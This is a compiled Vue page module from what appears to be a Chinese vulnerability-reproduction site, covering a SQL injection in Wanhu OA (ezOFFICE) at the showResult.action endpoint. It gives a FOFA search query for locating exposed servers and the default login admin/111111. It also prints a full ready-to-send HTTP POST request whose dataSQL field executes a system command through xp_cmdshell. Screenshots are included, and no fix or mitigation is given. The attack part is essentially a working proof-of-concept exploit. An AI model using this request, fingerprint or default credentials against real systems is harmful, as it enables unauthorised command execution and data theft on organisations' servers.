import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>万户OA showResult.action 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>万户OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;万户网络-ezOFFICE&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>产品页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201329080.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>默认账号密码：admin/111111</p><p>发送请求包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /defaultroot/Graph!showResult.action HTTP/1.1 
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded 
Content-Length: 69 
Connection: close
Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1 
Upgrade-Insecure-Requests: 1

database=localDataSource&amp;dataSQL=exec+master..xp_cmdshell+&quot;ipconfig&quot;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201329050.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13),s=[d];function l(c,r){return a(),i("div",null,s)}const h=e(t,[["render",l],["__file","万户OA showResult.action 后台SQL注入漏洞.html.vue"]]);export{h as default};
